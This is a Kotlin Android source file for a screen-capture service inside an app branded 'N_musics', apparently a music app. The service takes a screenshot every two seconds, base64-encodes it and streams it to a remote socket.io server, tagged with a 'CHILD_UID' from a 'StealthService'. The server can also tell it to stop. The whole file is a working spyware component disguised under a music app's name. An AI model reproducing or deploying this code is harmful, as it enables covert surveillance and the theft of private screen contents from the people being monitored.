package com.n.musics.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.io.ByteArrayOutputStream

class ScreenCaptureService : Service() {

    companion object {
        const val CHANNEL_ID = "N_musics_screen_channel"
        const val NOTIFICATION_ID = 102
        const val SERVER_URL = "https://n-musics-backend.onrender.com"
        private const val TAG = "ScreenCaptureService"

        var mediaProjection: MediaProjection? = null
        private var virtualDisplay: VirtualDisplay? = null
        private var imageReader: ImageReader? = null
        private var handler: Handler? = null
        private var socket: Socket? = null
        private var isCapturing = false
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "📸 Screen Capture Service created")
        createNotificationChannel()
        connectToServer()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = buildNotification()
        startForeground(NOTIFICATION_ID, notification)

        intent?.let {
            if (it.hasExtra("mediaProjectionCode") && it.hasExtra("mediaProjectionData")) {
                val code = it.getIntExtra("mediaProjectionCode", 0)
                val data = it.getParcelableExtra<Intent>("mediaProjectionData")
                startScreenCapture(code, data!!)
            }
        }

        return START_STICKY
    }

    private fun connectToServer() {
        try {
            val opts = IO.Options()
            opts.forceNew = true
            opts.reconnection = true
            socket = IO.socket(SERVER_URL, opts)

            socket?.on(Socket.EVENT_CONNECT) {
                Log.d(TAG, "✅ Screen Capture connected to server")
            }

            socket?.on("stop_screen_capture") {
                Log.d(TAG, "⏹️ Stop screen capture command received")
                stopScreenCapture()
            }

            socket?.connect()
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error connecting to server", e)
        }
    }

    private fun startScreenCapture(resultCode: Int, data: Intent) {
        if (mediaProjection == null) {
            val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = projectionManager.getMediaProjection(resultCode, data)
        }

        if (mediaProjection != null) {
            val metrics = resources.displayMetrics
            val width = metrics.widthPixels
            val height = metrics.heightPixels
            val density = metrics.densityDpi

            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)

            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ScreenCapture",
                width,
                height,
                density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_PRESENTATION,
                imageReader?.surface,
                null,
                handler
            )

            isCapturing = true
            handler = Handler(Looper.getMainLooper())

            handler?.postDelayed(object : Runnable {
                override fun run() {
                    if (isCapturing) {
                        captureAndSendScreenshot()
                        handler?.postDelayed(this, 2000)
                    }
                }
            }, 2000)

            Log.d(TAG, "🎥 Screen capture started")
        }
    }

    private fun captureAndSendScreenshot() {
        try {
            val image = imageReader?.acquireLatestImage() ?: return
            val width = image.width
            val height = image.height
            val planes = image.planes
            val buffer = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride = planes[0].rowStride
            val rowPadding = rowStride - pixelStride * width

            val bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888)
            bitmap.copyPixelsFromBuffer(buffer)
            image.close()

            val byteArrayOutputStream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 50, byteArrayOutputStream)
            val byteArray = byteArrayOutputStream.toByteArray()

            val base64Image = android.util.Base64.encodeToString(byteArray, android.util.Base64.NO_WRAP)

            val jsonData = JSONObject()
            jsonData.put("type", "screenshot")
            jsonData.put("image", base64Image)
            jsonData.put("uid", StealthService.CHILD_UID)

            socket?.emit("screen_data", jsonData)

            bitmap.recycle()

        } catch (e: Exception) {
            Log.e(TAG, "❌ Error capturing screenshot", e)
        }
    }

    private fun stopScreenCapture() {
        isCapturing = false
        virtualDisplay?.release()
        imageReader?.close()
        mediaProjection?.stop()
        mediaProjection = null
        stopSelf()
        Log.d(TAG, "⏹️ Screen capture stopped")
    }

    override fun onDestroy() {
        super.onDestroy()
        stopScreenCapture()
        socket?.disconnect()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Screen Capture",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Capturing screen"
                setShowBadge(false)
            }
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("N_musics")
            .setContentText("Screen sharing active...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }
}